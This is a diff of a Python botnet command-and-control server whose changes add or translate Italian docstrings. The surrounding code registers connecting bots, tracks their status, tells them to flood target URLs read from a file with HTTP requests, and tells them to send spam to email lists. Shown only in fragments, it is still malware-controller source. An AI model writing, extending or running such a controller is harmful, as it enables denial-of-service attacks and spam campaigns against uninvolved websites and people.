@@ -7,11 +7,13 @@ from concurrent.futures import ThreadPoolExecutor
 import requests
 
 server_address = ('10.0.2.15', 15200)
-# server_address = ('localhost', 15200)
 bots = []
 
 
 def write_on_json_file():
+    """
+    Scrive la lista dei bot sul file bot-db.json
+    """
     with open("bot-db.json", "w") as f:
         if len(bots) == 0:
             f.write("")
@@ -20,6 +22,9 @@ def write_on_json_file():
 
 
 def initialize_bot_list():
+    """
+    Inizializza la lista dei bot connessi leggendo il file bot-db.json
+    """
     with open("bot-db.json", "r") as f:
         if data := f.read():
             bs = json.loads(data)
@@ -31,7 +36,8 @@ def initialize_bot_list():
 
 def initialize(e):
     """
-    Initialize the server and listen for incoming connections.
+    Inizia il server e attende connessioni da parte dei bot. Alla connessione di un bot, lo aggiunge alla lista dei bot
+    e scrive la lista aggiornata sul file bot-db.json
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((server_address[0], server_address[1]))
@@ -59,8 +65,7 @@ def initialize(e):
 
 def start_server():
     """
-    Start a thread for the server and a thread to handle console input.
-    It will wait for both threads to finish before exiting the program.
+    Avvia il thread che gestisce il server e il thread che gestisce l'input da console
     """
     event = Event()
     with ThreadPoolExecutor(max_workers=2) as executor:
@@ -75,7 +80,7 @@ def start_server():
 
 def handle_console(e):
     """
-    Handle console input from the user.
+    Gestisce l'input da console e permette d'interagire con i bot
     """
     while not e.is_set():
         print("1. Mostra tutti i bot connessi")
@@ -118,7 +123,7 @@ def handle_console(e):
 
 def get_all_clients():
     """
-    Print all the clients connected to the server
+    Mostra tutti i bot connessi con i relativi indirizzi ip e porte
     """
     if len(bots) == 0:
         print("--------------------------------------")
@@ -136,7 +141,8 @@ def get_all_clients():
 
 def send_http_request():
     """
-    Start the attack of all the bots or of a specific bot
+    Permette d'inviare richieste http ai bot connessi. Legge il file urls-db.txt per ottenere gli url da attaccare
+    e permette di scegliere quale url attaccare.
     """
 
     with open("urls-db.txt", "r") as f:
@@ -158,6 +164,11 @@ def send_http_request():
 
 
 def print_client_info(client, res):
+    """
+    Stampa le informazioni di un bot
+    :param client: indirizzo ip del bot
+    :param res: risposta del bot
+    """
     print(f"Client Ip: {client}")
     print(f"CPU: {res.json()['cpu']}")
     print(f"Machine: {res.json()['machine']}")
@@ -167,6 +178,10 @@ def print_client_info(client, res):
 
 
 def mail_spam():
+    """
+    Invia email spam ai bot connessi. Legge il file spam-db.txt per ottenere gli indirizzi email da attaccare.
+    Permette di scegliere quante email inviare.
+    """
     with open("spam-db.txt", "r") as f:
         emails = f.read().split("\n")
         emails = [email for email in emails if email != ""]
@@ -191,6 +206,12 @@ def mail_spam():
 
 
 def find_bot(path, method, j=None):
+    """
+    Permette di scegliere un bot a cui inviare una richiesta http oppure invia la richiesta a tutti i bot connessi.
+    :param path: Path della richiesta http
+    :param method: metodo della richiesta http
+    :param j: body della richiesta http
+    """
     if len(bots) == 0:
         print("Nessun bot connesso")
         return
@@ -221,7 +242,7 @@ def find_bot(path, method, j=None):
 
 def bot_status():
     """
-    Check if a bot is still connected to the server.
+    Controlla lo stato dei bot connessi
     """
     for bot in bots:
         try:
@@ -243,7 +264,7 @@ def bot_status():
 
 def rimuovi_bot_inattivi():
     """
-    Remove all the inactive bots
+    Rimuove i bot inattivi
     """
     for bot in bots:
         if not check_bot_is_active(bot):
@@ -251,7 +272,13 @@ def rimuovi_bot_inattivi():
             bots.remove(bot)
     write_on_json_file()
 
+
 def check_bot_is_active(bot):
+    """
+    Controlla se un bot è attivo
+    :param bot: indirizzo ip di un bot
+    :return: True se il bot è attivo, False altrimenti
+    """
     try:
         res = requests.get(f"http://{bot[0]}:{bot[1]}/status")
         return res.status_code == 200
